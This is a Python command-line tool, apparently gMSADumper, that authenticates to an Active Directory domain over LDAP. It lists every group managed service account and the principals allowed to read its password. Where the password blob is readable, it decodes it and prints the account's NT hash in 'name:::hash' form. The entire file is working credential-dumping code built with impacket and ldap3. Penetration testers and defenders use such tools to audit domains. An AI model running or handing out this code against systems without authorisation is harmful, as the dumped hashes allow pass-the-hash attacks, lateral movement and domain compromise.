#!/usr/bin/env python3
from ldap3 import ALL, Server, Connection, NTLM, SASL, KERBEROS, extend, SUBTREE
import argparse
import binascii
from Cryptodome.Hash import MD4
from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
from impacket.structure import Structure
import sys

parser = argparse.ArgumentParser(description='Dump gMSA Passwords')
parser.add_argument('-u','--username', help='username for LDAP', required=False)
parser.add_argument('-p','--password', help='password for LDAP (or LM:NT hash)',required=False)
parser.add_argument('-k','--kerberos', help='use kerberos authentication',required=False, action='store_true')
parser.add_argument('-l','--ldapserver', help='LDAP server (or domain)', required=False)
parser.add_argument('-d','--domain', help='Domain', required=True)

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

def base_creator(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]

def main():
    args = parser.parse_args()

    if args.kerberos and (args.username or args.password):
        print("-k and -u|-p options are mutually exclusive")
        sys.exit(-1)
    if args.password and not args.username:
        print("specify a username or use -k for kerberos authentication")
        sys.exit(-1)
    if args.username and not args.password:
        print("specify a password or use -k for kerberos authentication")
        sys.exit(-1)    

    if args.ldapserver:
        server = Server(args.ldapserver, get_info=ALL)
    else:
        server = Server(args.domain, get_info=ALL)

    if not args.kerberos:
        conn = Connection(server, user='{}\\{}'.format(args.domain, args.username), password=args.password, authentication=NTLM, auto_bind=True)
    else:
        conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
    conn.start_tls()
    success = conn.search(base_creator(args.domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership'])
    
    if success:
        for entry in conn.entries:
                sam = entry['sAMAccountName'].value
                print('Users or groups who can read password for '+sam+':')
                for dacl in SR_SECURITY_DESCRIPTOR(data=entry['msDS-GroupMSAMembership'].raw_values[0])['Dacl']['Data']:
                    conn.search(base_creator(args.domain), '(&(objectSID='+dacl['Ace']['Sid'].formatCanonical()+'))', attributes=['sAMAccountName'])
                    print(' > ' + conn.entries[0]['sAMAccountName'].value)
                if entry['msDS-ManagedPassword']:
                    data = entry['msDS-ManagedPassword'].raw_values[0]
                    blob = MSDS_MANAGEDPASSWORD_BLOB()
                    blob.fromString(data)
                    hash = MD4.new ()
                    hash.update (blob['CurrentPassword'][:-2])
                    passwd = binascii.hexlify(hash.digest()).decode("utf-8")
                    userpass = sam + ':::' + passwd
                    print(userpass)

if __name__ == "__main__":
    main()
